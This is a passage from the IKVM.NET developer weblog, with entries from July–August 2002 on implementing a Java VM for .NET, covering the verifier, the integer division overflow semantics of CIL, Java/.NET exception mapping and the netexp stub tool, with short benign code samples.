		08/12/2002 16:41:14 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=39"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=39">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Friday, 09 August 2002</h2></div>
<div class="newsItems"><a name="a38"></a><div class="entry">
	<h3 class="entryTitle"></h3>
	<div class="entryBody">
		<P>I did some refactoring and various small changes. Field &amp; method accessibilty is now enforced (although there still are some issues).</P>
<P>Updated the <A href="http://www.frijters.net/ikvm.zip">snapshot</A>.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		08/09/2002 16:11:29 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=38"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=38">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Thursday, 08 August 2002</h2></div>
<div class="newsItems"><a name="a37"></a><div class="entry">
	<h3 class="entryTitle"></h3>
	<div class="entryBody">
		<P>Stuart commented:</P>
<P><EM>What do you do if you have a Java program that depends on String.hashCode() doing exactly what Java defines it to do (ie, produce consistent output with other VMs) rather than what .NET defines String.GetHashCode() to do? I encountered this in my own code so in theory I can implement (or steal from ClassPath) an implementation of String.hashCode() and use that, but the problem could come up in other scenarios. It's an interesting one, don't you think? :) </EM></P>
<P>I haven't gotten around to implementing it, but the idea is that all virtual calls to Object.toString() are changed to:</P>
<P>&nbsp; if(o instanceof String) return StringHelper.hashCode(o);<BR>&nbsp; else return Object.GetHashCode();</P>
<P>One&nbsp;reason I haven't done this yet, is because I think it is totally <STRONG>brain damaged </STRONG>that Sun actually specified the hashcode algorithm for String (and in JLS 1.0 they specified a broken algorithm, which JDK 1.0 didn't implement), another reason is that I haven't figured out how to build this generically (specified in the&nbsp;map.xml&nbsp;file, instead of hardcoded in the VM).</P>
<P>A similar issue also occurs with Object.toString(). Nonvirtual calls to Object.toString() should be redirected to a helper function that returns:</P>
<P>&nbsp; getClass().getName() + "@" + Integer.toHexString(hashCode())</P>
<P>This isn't really a problem (if you accept the fact that non-Java classes return something different for toString(), which I do), <STRONG>but </STRONG>for arrays it does pose a problem. For arrays to return the proper string when toString() is called on them (virtually through an object reference), all virtual calls to Object.toString() need to be treated like hashCode() above.</P>
<P><EM>btw, how come your example isn't "import System.Reflection"? Does netexp auto-lowercase all namespace names?</EM></P>
<P>At the moment it does. Not because this is the Java convention, but because Java cannot really deal with a namespace System (because of the class java.lang.System).</P>
<P><EM>That seems risky if (as I believe, but don't know for sure) it's possible to have two distinct .NET namespaces with names differing only by case... </EM></P>
<P>This is true, but in practice it seems unlikely you'll ever encounter a problem with this, but the case conversion will definitely be optional in the future.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		08/08/2002 10:13:57 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=37"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=37">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 07 August 2002</h2></div>
<div class="newsItems"><a name="a36"></a><div class="entry">
	<h3 class="entryTitle"></h3>
	<div class="entryBody">
		<P>I started work <EM>netexp.</EM> This is the tool that generates Java stubs for all public types in a .NET assembly, so that Java code can be compiled against .NET code (using any standard Java compiler). The VM understands the stubs and replaces any references to them with the actual .NET types.</P>
<P>It's still in its very early stages, but here is an example that already runs:</P><PRE>import system.*;<BR>import system.reflection.*;</PRE><PRE>class test<BR>{<BR>&nbsp; public static void main(String[] args)<BR>&nbsp; {<BR>&nbsp;&nbsp;&nbsp; Type type = Type.GetType("System.Object");<BR>&nbsp;&nbsp;&nbsp; ConstructorInfo ci = type.GetConstructor(<BR>       BindingFlags.Public | BindingFlags.Instance,<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; null, Type.EmptyTypes, null);<BR>&nbsp;&nbsp;&nbsp; Console.WriteLine(ci);<BR>&nbsp; }<BR>}</PRE>
<P>I updated the <A href="http://www.frijters.net/ikvm.zip">snapshot</A>.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		08/07/2002 16:11:58 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=36"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=36">Comments [2]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Tuesday, 06 August 2002</h2></div>
<div class="newsItems"><a name="a35"></a><div class="entry">
	<h3 class="entryTitle"></h3>
	<div class="entryBody">
		<P>I wrote a jasmin class that "uses" all bytecode instructions, to check if I had implemented all of them. It turns out three were missing:</P>
<UL>
<LI><EM>jsr_w</EM>&nbsp; -- jump to subroutine using a 32 bit offset (methods have a maximum size of 64KB, so why we need this, I don't know)</LI>
<LI><EM>goto_w</EM> -- jump to instruction using a 32 bit offset (see jsr_w)</LI>
<LI><EM>dup2_x2</EM> -- scramble the contents of the stack ;-)</LI></UL>
<P>I implemented all three, although I very much doubt that they'll ever be used.</P>
<P>In the process of doing this, I found and fixed a few bugs in the verifier and compiler. I also changed the compiler to generate a "throw VerifyError("...")" when compiling a method that doesn't verify (instead of throwing the exception at compile time). This matches the JVM behaviour better.</P>
<P>Updated snapshot is <A href="http://www.frijters.net/ikvm.zip">here</A>.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		08/06/2002 14:09:00 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=35"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=35">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Friday, 02 August 2002</h2></div>
<div class="newsItems"><a name="a34"></a><div class="entry">
	<h3 class="entryTitle"></h3>
	<div class="entryBody">
		<P>Stuart commented:</P>
<P><EM>Btw, I'm just trying out your latest snapshot. I'll add further comments as I get further, but so far I had to make a couple of changes to let me build: </EM></P>
<P><EM>VS.NET treated "if (false)" on line 1732 of vm.cs as creating unreachable code. I changed it to "if (false.Equals(true))" so that it didn't treat it as a compiletime constant. </EM>
<P>I'm used to using the if(false) construct, because that's the way to <STRONG>not </STRONG>get the compiler to complain in Java. Anyway, I just commented it out now, it's only there for debugging. So it will go away in the near future, I hope.
<P><EM>And the default compilation options disallowed unsafe code, so I had to change that in order for BigEndianBinaryReader.cs to compile.</EM></P>
<P>Aren't you using my VS.NET project? That should include the proper switches for it to build, at least it builds on my machine ;-)</P>
<P><EM>Okay, I've got it to the point of giving me an intelligent error at runtime, at least. Issues so far: </EM></P>
<P><EM>It doesn't (seem to) honor CLASSPATH, at least when run from a command prompt.</EM>
<P>That is correct, for the time being it uses the&nbsp;IKVM_CLASSPATH environment variable. BTW, zips and jars are not supported (and won't be for a while, because I want to write the Zip/Jar class loader in Java. That isn't going to happen until after I've got the ahead-of-time compiler working).
<P><EM>Now the showstopper that I haven't been able to figure out how to get past. As far as I can see the download doesn't include *any* of the GNU Classpath libraries, which means that (as far as I can see) it can't run anything at all. I'm guessing that this is just a simple omission from the zip - is that right?</EM></P>
<P>I don't include the classpath stuff to keep the zip small. I did earlier post a link to the compiled classpath classes that I use. I've created a new <A href="http://www.frijters.net/ikvm.zip">snapshot</A> (many small changes) and also posted a <A href="http://www.frijters.net/cp.zip">zip</A> containing the classpath classes plus a few of my own modifications (the source for those is in the classes directory in ikvm.zip).</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		08/02/2002 10:12:28 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=34"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=34">Comments [2]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Thursday, 01 August 2002</h2></div>
<div class="newsItems"><a name="a33"></a><div class="entry">
	<h3 class="entryTitle"></h3>
	<div class="entryBody">
		<P>Stuart commented:</P>
<P><EM>On most aspects, you've convinced me. Just a few little comments: </EM></P>
<P><EM>wrt "throws Exception" vs "throws Throwable" - there's no difference. Any Java method can throw any Throwable subclass that isn't an Exception subclass, just as any Java method can throw any RuntimeException subclass. Thus "throws Exception" really does let you throw anything. </EM>
<P>Actually, no. Try to compile the following:<PRE>class test extends Throwable<BR>{<BR>  public static void main(String[] args) throws Exception<BR>  {<BR>    throw new test();<BR>  }<BR>}</PRE>
<P>It doesn't compile. One of the inellegancies of Java's checked exceptions model is that there are two classes that removed the <EM>checkedness, </EM>both Error and RuntimeException.
<P><EM>Btw, are you arranging that (most? any?) .NET exceptions end up as subclasses of j.l.Exception, or just direct Throwable subclasses?</EM>
<P>Throwable, the most important reason is that I don't want to mess with the class hierarchy, if at all possible.
<P><EM>I agree also that remapping things like InputStream is probably too hard. If you have a generic class/interface/method remapping system, though, I can imagine actually experimenting with Collection vs IEnumerable and indexers on List.</EM>
<P>One of the goals of XML remapping system, is to enable exactly these types of experiments. It probably isn't flexible enough to do everything you'd want to do, but in the end we'll get there.
<P><EM>When you get IK.VM working on Mono I might even have a try at that myself, since it shouldn't need any deep magic in the VM itself. </EM>
<P>I think it'll still be a while before Reflection.Emit in Mono is at the level where it is complete enough.
<P><EM>Oh, and I like the idea of custom attributes to do "throws" expressions on glue code. I wonder if we could persuade the Mono people to get mcs to actually honor the "throws" attributes - ie, compile C# code with Java's 'checked exceptions' semantics. That would be pretty cool :) </EM>
<P>It would be cool, but I don't really like checked exceptions. After programming in Java (almost exclusively) for about five years, I finally decided that the cons outnumber the pros. The idea is compelling, but in practice there are too many problems, but I don't really want to start that war, as it has been waged many times already ;-)
<P>BTW, I just&nbsp;changed the&nbsp;<EM>idiv, ldiv, irem &amp; lrem</EM> implementations to explicity check for -1, and for a lame little test I wrote, performance seems to be OK (same as JDK 1.1 and slightly faster than JDK 1.4, HotSpot doesn't like microbenchmarks ;-)).</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		08/01/2002 17:14:02 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=33"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=33">Comments [3]</a>
		
		<br clear="all">
	</div>
</div><a name="a32"></a><div class="entry">
	<h3 class="entryTitle"></h3>
	<div class="entryBody">
		<P>Zoltan <A href="http://weblog.ikvm.net/commentview.aspx/30">commented</A> on the <EM>div </EM>issue:</P>
<P><EM>I believe the reason the CLR throws an exception in this case is that the div CIL opcode is compiled down to the idiv x86 opcode, which raises a hardware exception in case of overflow. A div opcode which does not throw an exception would be much slower, since it would have to be implemented by a series of x86 opcodes. </EM></P>
<P>You're correct. I mistakenly believed that the x86 <EM>idiv </EM>instruction didn't throw an exception on overflow, but it does (it doesn't in real-mode, which is what I remembered). Still, it would be trivial in the x86&nbsp;overflow exception handler to detect that it&nbsp;is handling this case and then resume execution after the idiv instruction with the correct results in the registers. This wouldn't make any performance difference for the common case, only the exceptional case would be a little slower.</P>
<P>Stuart commented:</P>
<P><EM>Horrible hacky proposed solution: implement idiv using the broken div, but add an exception handler to every java method that uses idiv that tests for the pathological case and somehow resumes in the right place.</EM></P>
<P>Two problems with this approach: 1) OverflowException can also be caused by trying to allocate a new array with a negative size, so I would somehow have to detect this.&nbsp;2) Resuming after the exception is very hard (you cannot jump into a try block in .NET, so I'd have to generate lots of code, which would also make to common case slower).</P>
<P><EM>Or just wrap map java (x/y) to try{x/y} catch(OverflowException e) {x}. How much execution overhead is there for a try-catch in the non-exception case? </EM></P>
<P>This is an interesting suggestion. *writing some C# microbenchmarks* Here is the code I cooked up:</P><PRE>&nbsp;public static void Main(string[] args)<BR>&nbsp;{<BR>&nbsp;&nbsp;int d = args.Length + 1;<BR>&nbsp;&nbsp;int n = (args.Length - 1) * -1;<BR>&nbsp;&nbsp;int start = Environment.TickCount;<BR>&nbsp;&nbsp;for(int i = 0; i &lt; 10000000; i++)<BR>&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;try<BR>&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;n = n / d;<BR>&nbsp;&nbsp;&nbsp;}<BR>&nbsp;&nbsp;&nbsp;catch(OverflowException)<BR>&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;n = int.MinValue;<BR>&nbsp;&nbsp;&nbsp;}<BR>&nbsp;&nbsp;}<BR>&nbsp;&nbsp;int end = Environment.TickCount;<BR>&nbsp;&nbsp;Console.WriteLine(end - start);<BR>&nbsp;&nbsp;start = Environment.TickCount;<BR>&nbsp;&nbsp;for(int i = 0; i &lt; 10000000; i++)<BR>&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;if(d == -1)<BR>&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;n = n * d;<BR>&nbsp;&nbsp;&nbsp;}<BR>&nbsp;&nbsp;&nbsp;else<BR>&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;n = n / d;<BR>&nbsp;&nbsp;&nbsp;}<BR>&nbsp;&nbsp;}<BR>&nbsp;&nbsp;end = Environment.TickCount;<BR>&nbsp;&nbsp;Console.WriteLine(end - start);<BR>&nbsp;}</PRE>On my system there is almost no difference between these two methods, so I think I'll go for the explicit test, because&nbsp;of the additional complexity of moving the stack into the try block.
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		08/01/2002 10:43:40 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=32"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=32">Comments [0]</a>
		
		<br clear="all">
	</div>
</div><a name="a31"></a><div class="entry">
	<h3 class="entryTitle"></h3>
	<div class="entryBody">
		<P>More very useful <A href="http://weblog.ikvm.net/commentview.aspx/29">comments</A> from Stuart:</P>
<P><EM>I'm not sure what I think about your choice to not remap things like IOException, and to handle it in the pseudo-native code.</EM></P>
<P>The principle of "least surprise" applies here. When Java code specifically calls .NET I/O code, it expect System.IO.IOException (because that is what the documentation says), and vice versa.</P>
<P><EM>With regard to "throws Exception" in the generated JAR files, I'm not sure how I feel about it either. On the one hand, yes, it's certainly awkward for the Java programmer. On the other hand, it's exactly what the CLR really *does*, by implication - any method *can* throw any exception. </EM>
<P><EM>Here's a problem case: I could define a Java exception, use IK.VM to compile it to CIL, and then write a C# class that throws it and call that C# class from Java - how would you handle that case with your proposed solution? You can either preserve the "real" Java mapping of the compiled Java exception, OR you can make it a subclass of RuntimeException, but you can't do both. But you really do want to be able to preserve the semantics of a custom-compiled Java exception. Assuming "throws Exception" for all C# code seems to be the only way you *can* deal with this case, because you there's no way you can detect it to specialcase it. </EM></P>
<P>You've conviced me, making all .NET methods declare "throws Throwable" (not Exception), is the only viable solution to this. I'm probably going to support a custom attribute to explicitly declare a throws clause in .NET code for newly written code, to make writing glue code a little less painful.</P>
<P><EM>Yet another couple of semantics-impedance-mismatch issues that I just thought of: Do you plan to allow indexers and foreach to work on java.util.List and java.util.Collection, respectively? Will Collection implement(/extend) IEnumerable with Iterator remapping to IEnumerator? How about the converse ( for (Iterator i = new System.ArrayList().iterator(); i.hasNext(); ) {...} )? Or even, more complicatedly, {Input,Output}Stream and Reader/Writer mapping to .NET equivalents? </EM></P>
<P>No, none of these. It's much easier to writer wrapper classes to handle these conversions than to have the VM handle it.</P>
<P><EM>Will JavaBeans-compatible getFoo()/setFoo() methods remap to a property called foo? Or even to a property called Foo? (even the naming conventions are incompatible...)</EM></P>
<P>Java "properties" are too semantically weak to be useful. There are many methods getXxx() where Xxx isn't a read-only property (Component.getGraphics(), for example) so I'm not going to do anything with them.</P>
<P><EM>You'll notice that I'm posing ever more complicated scenarios - sorry! :)</EM></P>
<P>The feedback is very helpful, thanks!</P>
<P><EM>The reason I'm deliberately making your life difficult is that you seem to have all the easy cases well covered already...</EM></P>
<P>I disagree ;-) The hardest part was figuring out how to do the basic object model mapping (like Sam Ruby <A href="http://weblog.ikvm.net/commentview.aspx/6">said</A>, Object, String,&nbsp;and Exception).</P>
<P><EM>and besides, I'm highly interested to see just how deeply integrated into the .NET platform Java can really get without losing it's soul... </EM></P>
<P>Me too. The priorities are the hard part, in many cases there is a trade off between performance and 100% compatibility, but a compatible JVM is a higher priority than interop with other .NET code (which isn't too say that isn't important).</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		08/01/2002 10:15:03 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=31"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=31">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 31 July 2002</h2></div>
<div class="newsItems"><a name="a30"></a><div class="entry">
	<h3 class="entryTitle"></h3>
	<div class="entryBody">
		<P><STRONG>What's wrong with this picture?</STRONG></P><PRE>class DivTest<BR>{<BR>&nbsp;public static void Main()<BR>&nbsp;{<BR>&nbsp;&nbsp;int i = int.MinValue;<BR>&nbsp;&nbsp;System.Console.WriteLine(-i);<BR>&nbsp;&nbsp;System.Console.WriteLine(i * -1);<BR>&nbsp;&nbsp;System.Console.WriteLine(i / -1);<BR>&nbsp;}<BR>}</PRE>
<P>Why does <EM>div</EM> throw an OverflowException when you're trying to divide MinInt by -1? I'm assuming that since dividing by zero throws a DivideByZeroException, the CLR designers thought it would be nice if <EM>div</EM> would throw an exception for overflow as well.</P>
<P><STRONG><FONT size=3>This sucks!</FONT></STRONG></P>
<P>Partition III CIL.doc section 3.31 about <EM>div</EM> says:</P>
<P class=Label style="MARGIN: 0in 0in 3pt 25pt"><STRONG><EM><FONT face="Courier New" size=2>Exceptions:</FONT></EM></STRONG></P>
<P class=Text style="MARGIN: 0in 0in 6pt 25pt"><FONT face="Times New Roman" size=2>Integral operations throw </FONT><SPAN class=CodeEmbedded><SPAN style="FONT-SIZE: 8pt"><FONT face="Courier New" color=#000080>ArithmeticException </FONT></SPAN></SPAN><FONT face="Times New Roman" size=2>if the result cannot be represented in the result type. This can happen if <I>value1</I> is the maximum negative value, and <I>value2</I> is -1.</FONT></P>
<P class=Text style="MARGIN: 0in 0in 6pt 25pt"><FONT face="Times New Roman" size=2>Integral operations throw </FONT><SPAN class=CodeEmbedded><SPAN style="FONT-SIZE: 8pt"><FONT face="Courier New" color=#000080>DivideByZeroException </FONT></SPAN></SPAN><FONT face="Times New Roman" size=2>if <I>value2</I> is zero.</FONT></P>
<DIV style="BORDER-RIGHT: windowtext 1pt dashed; PADDING-RIGHT: 4pt; BORDER-TOP: windowtext 1pt dashed; PADDING-LEFT: 4pt; BACKGROUND: #e5e5e5; PADDING-BOTTOM: 1pt; MARGIN-LEFT: 25pt; BORDER-LEFT: windowtext 1pt dashed; MARGIN-RIGHT: 0in; PADDING-TOP: 1pt; BORDER-BOTTOM: windowtext 1pt dashed; mso-border-alt: dashed windowtext .5pt; mso-shading: windowtext; mso-pattern: gray-10 auto">
<P class=MS-Only style="BACKGROUND: #e5e5e5; MARGIN: 0in 0in 6pt; TEXT-ALIGN: center; mso-shading: windowtext; mso-pattern: gray-10 auto" align=center><B><SPAN style="COLOR: navy"><FONT size=2><FONT face="Times New Roman">Implementation Specific (Microsoft)<?xml:namespace prefix = o ns = "urn:schemas-microsoft-com:office:office" /><o:p></o:p></FONT></FONT></SPAN></B></P>
<P class=MS-Only style="BACKGROUND: #e5e5e5; MARGIN: 0in 0in 6pt; mso-shading: windowtext; mso-pattern: gray-10 auto"><FONT face="Times New Roman" size=2>On the x86 an </FONT><SPAN class=CodeEmbedded><SPAN style="FONT-SIZE: 8pt"><FONT face="Courier New" color=#000080>OverflowException </FONT></SPAN></SPAN><FONT face="Times New Roman" size=2>is thrown when computing (minint </FONT><SPAN class=CodeFeaturedElement><SPAN style="FONT-SIZE: 8pt"><STRONG><FONT face="Courier New" color=#000080>div</FONT></STRONG></SPAN></SPAN><FONT face="Times New Roman" size=2> 1).</FONT></P></DIV>
<P>Why didn't they define a <EM>div.ovf </EM>(like there are <EM>add.ovf</EM>, <EM>sub.ovf</EM>, <EM>mul.ovf</EM>, etc.) in addition to <EM>div </EM>(and then make <EM>div </EM>behave consistently with <EM>add</EM>, <EM>sub</EM> &amp;&nbsp;<EM>mul</EM>)?</P>
<P>Question: What should I do? Implement Java's <EM>idiv </EM>bytecode using this broken <EM>div</EM>&nbsp;or compile them into conditional code that checks for MinInt / -1 and treats that specially (and thus slowing down integer division).</P>
<P>BTW, J# uses <EM>div </EM>but I'm not sure they actually thought about this issue. The following code crashes the J# compiler:</P><PRE> System.out.println(Integer.MIN_VALUE / - 1);</PRE>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		07/31/2002 16:14:23 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=30"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=30">Comments [2]</a>
		
		<br clear="all">
	</div>
</div><a name="a29"></a><div class="entry">
	<h3 class="entryTitle"></h3>
	<div class="entryBody">
		<P>I only just noticed that <A href="mailto:sballard@wuffies.net">Stuart</A>&nbsp;commented on the July 25 <A href="http://weblog.ikvm.net/commentview.aspx/26">item</A>:</P>
<P><EM>The natural "con" that I can think of regarding your alternative implementation is that it would make it very difficult for Java code to catch System.Exception. At least it would require that code that wants to catch *any* exception would have to know that it might be running under IK.VM and explicitly catch System.Exception, where a normal Java program might expect to be able to catch Throwable. </EM></P>
<P>I didn't mention this, but I would still map all usages of java.lang.Throwable to System.Exception (except in the case of the base class, when a class is derived from Throwable, it would be derived from Throwable). Sensible interop between .NET and Java exceptions is definitely something I'm aiming for.</P>
<P><EM>The difficulty, it seems to me, is ensuring that you don't just have a good mapping from Java to C#, but that your mapping is fully *reversible*, and makes just as much sense going the other way. Java code expects to know exactly what exceptions are going to happen for a particular method, so you'll need to be remapping things like IOException already - and you'll need some way to ensure that any exception that's going to be thrown by a method where Java doesn't expect it gets mapped to a RuntimeException (or Error or direct Throwable subclass) with the original exception as the cause. </EM>
<P>I'm not actually remapping exceptions like IOException, what happens is that the "native" code that implements an I/O function catches the System.IO.IOException and throws a java.io.IOException.
<P>CLR generated exceptions get converted to the Java equivalent when they are first caught. At the moment I don't convert them back, so when .NET code calls Java code it can expect both System.NullReferenceException and java.lang.NullPointerException to be thrown (for example) depending on whether the Java code "caught" (a finally also triggers the conversion)&nbsp;the exception before it was propagated out the calling .NET code. This isn't very elegant, so I expect that in the future I'll be swapping the original exception back when the Java code rethrows the exception.
<P><EM>I suppose that your generated JAR files (described in your previous entry in response to my comment) will have to declare every method as "throws Exception", right? </EM></P>
<P>To be honest, I hadn't even thought about this. My initial&nbsp;thought would be to make it seem (for the Java compiler) as if every .NET exception is derived from RuntimeException to get around this mess. This might cause additional complications, so I'm going to have to think about this a little more. Adding "throws Exception" doesn't appeal to me either, because that would make it very uncomfortable for the Java programmer trying to call .NET code.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		07/31/2002 15:29:13 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=29"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=29">Comments [2]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 29 July 2002</h2></div>
<div class="newsItems"><a name="a28"></a><div class="entry">
	<h3 class="entryTitle"></h3>
	<div class="entryBody">
		<P>I found an interesting <A href="http://www.cs.kun.nl/~erikpoll/ftfjp/2002/AllessandroCoglio.pdf">paper</A> on <EM>jsr/ret</EM> verification. It contains the following example of valid Java code that is <STRONG>not</STRONG> verifiable with the <A href="http://java.sun.com/docs/books/vmspec/2nd-edition/html/ClassFile.doc.html#9862">verification algorithm</A> described in the JVM spec:</P><PRE>static int m(boolean x) {<BR>&nbsp; int y;<BR>&nbsp; try {<BR>&nbsp;&nbsp;&nbsp; if(x) return 1;<BR>&nbsp;&nbsp;&nbsp; y = 2;<BR>&nbsp; } finally {<BR>&nbsp;&nbsp; &nbsp;if(x) y = 3;<BR>&nbsp; }<BR>&nbsp; return y;<BR>}<BR></PRE>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		07/29/2002 18:12:48 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=28"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=28">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Saturday, 27 July 2002</h2></div>
<div class="newsItems"><a name="a27"></a><div class="entry">
	<h3 class="entryTitle"></h3>
	<div class="entryBody">
		<P>I finally implemented the local variable usage tracking for <EM>subroutines </EM>in the verifier. In this instance Microsoft certainly did learn from Sun's mistakes. The JVM verifier is ridiculously complex because of two <EM>features</EM>:</P>
<UL>
<LI>jsr &amp; ret instructions (<EM>subroutines </EM>within a method) 
<LI>untyped local variables</LI></UL>
<P>The CLR lacks both of those features. The reason Sun introduced <EM>subroutines </EM>is&nbsp;because code in&nbsp;a finally block needs to run both in the normal case and in the exception case, there are two ways you can compile this (Java's bytecode has no concept of finally blocks): code duplication or the <EM>subroutine</EM> construct.&nbsp;Microsoft solved this by explicitly supporting finally blocks in MSIL, a far more elegant solution. Having typed local variables really doesn't have any downside (except that you have slightly more metadata to carry around).</P>
<P>Updated the <A href="http://www.frijters.net/ikvm.zip">snapshot</A>.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		07/27/2002 10:51:05 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=27"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=27">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Thursday, 25 July 2002</h2></div>
<div class="newsItems"><a name="a26"></a><div class="entry">
	<h3 class="entryTitle"></h3>
	<div class="entryBody">
		<P>More java.lang.Throwable</P>
